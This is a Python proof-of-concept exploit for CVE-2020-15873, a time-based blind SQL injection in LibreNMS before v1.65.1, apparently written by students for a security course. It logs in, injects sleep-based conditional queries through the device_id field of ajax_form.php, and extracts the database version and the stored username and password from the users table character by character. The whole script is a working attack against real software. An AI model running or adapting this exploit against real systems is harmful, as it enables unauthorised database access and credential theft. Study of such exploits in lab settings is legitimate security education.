'''

Module: CS4239
Semester: AY2021 Semester 1


PoC of CVE-2020-15873 - Blind SQL Injection in Librenms < v1.65.1


Authors:
1. ANG Chin Guan, Melvin
2. CHEAH Zhi Kang
3. LEE Bo Qiang
4. POH Jia Hao
5. TAN Wei Sheng, Jerome


Pre-req:
1. Docker container running Libre v1.65 and below
2. Login as librenms:librenms
3. Create a device using the GUI, toggle "snmp" off and set the host to '127.0.0.1'.
4. Run this script: python poc.py <ip addr:8000> librenms librenms

'''


import requests
import sys
from bs4 import BeautifulSoup

s = requests.Session()

# Burp is assumed to be listening on port 8080.
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def sqli(ip, inj_str):
    for j in range(32, 127):
        if send_request(ip, inj_str.replace("[CHAR]", str(j))):
            return chr(j)
    
def send_request(ip, payload):
    target = "http://{}/ajax_form.php".format(ip)
    p_data = {"action": "test", "type": "customoid", "device_id": payload}

    # Swap the comment on 2 lines below to debug using Burp
    r = s.post(target, data=p_data)
    #r = s.post(target, data=p_data, proxies=proxies)

    # Uncomment the line below to see what is being sent to the server
    #print payload

    if (round(r.elapsed.total_seconds()) > 3):
        return True
    return False

def login(ip):
    login_url = "http://{}/login".format(ip)
    response = s.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    _token = soup.find('input')['value'] 
    username = sys.argv[2]
    password = sys.argv[3]
    login_data = {"_token": _token, "username": username, "password": password, "remember": "on", "submit":""}
    login = s.post(login_url, data=login_data)
    if "Logout" not in login.text:
        print "[-] Failed to login! Are the credentials correct?"
        sys.exit(-1)

def guess_version_length(ip):
    for i in range(1, 255):
        injection_string ="1 AND IF(LENGTH((SELECT version()))={},sleep(4),'a');-- -".format(i)
        output = send_request(ip, injection_string)
        if output:
            return i
    print "[-] Failed to guess version length! Is the target using a vulnerable LibreNMS version?"
    sys.exit(-1)

def guess_version_string(ip, ver_length):
    ver_string = ""

    for i in range(1, ver_length + 1):
        injection_string ="1 AND IF(ASCII(SUBSTRING((SELECT version()),{},1))=[CHAR],sleep(4),'a');-- -".format(i)
        character = sqli(ip, injection_string)
        if character:
            ver_string += character
            sys.stdout.write(character)
            sys.stdout.flush()
        else:
            print "[-] Skipped character position: {} due to not being in ASCII range.".format(i)

    return ver_string

def guess_variable_length(ip, variable, table):
    for i in range(1, 255):
        injection_string ="1 AND IF(LENGTH((SELECT {} FROM {} LIMIT 1))={},sleep(4),'a');-- -".format(variable, table, i)
        output = send_request(ip, injection_string)
        if output:
            return i
    print "[-] Failed to guess {} length! Is the injection query formatted correctly?".format(variable)
    sys.exit(-1)

def guess_variable_string(ip, variable, variable_length, table):
    var_string = ""

    for i in range(1, variable_length + 1):
        injection_string = "1 AND IF(ASCII(SUBSTRING((SELECT {} FROM {} LIMIT 1),{},1))=[CHAR],sleep(4),'a');-- -".format(variable, table, i)
        character = sqli(ip, injection_string)
        if character:
            var_string += character
            sys.stdout.write(character)
            sys.stdout.flush()
        else:
            print "[-] Skipped character position: {} due to not being in ASCII range.".format(i)

    return var_string

def main():
    ip = sys.argv[1]
    print "[+] Attempting to login..."
    login(ip)
    print "[+] Logged in successfully!\n"

    print "[+] Retrieving database version length..."
    ver_length = guess_version_length(ip)
    print "[+] Length of database version string is: {}-characters long.\n".format(ver_length)

    print "[+] Retrieving database version...."
    ver_string = guess_version_string(ip, ver_length)
    print "\n[+] Database version is: {}\n".format(ver_string)

    print "[+] Retrieving username length from users table..."
    user_length = guess_variable_length(ip, "username", "users")
    print "[+] Length of username string is: {}-characters long.\n".format(user_length)

    print "[+] Retrieving username from users table..."
    user_string = guess_variable_string(ip, "username", user_length, "users")
    print "\n[+] Username is: {}\n".format(user_string)

    print "[+] Retrieving password length from users table..."
    pass_length = guess_variable_length(ip, "password", "users")
    print "[+] Length of password string is: {}-characters long.\n".format(pass_length)

    print "[+] Retrieving password from users table..."
    pass_string = guess_variable_string(ip, "password", pass_length, "users")
    print "\n[+] Password is: {}\n".format(pass_string)


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print "[+] Usage: {} <target> <username> <password>".format(sys.argv[0])
        print "[+] Example: {} domain/ip username password".format(sys.argv[0])
        sys.exit(-1)
    main()
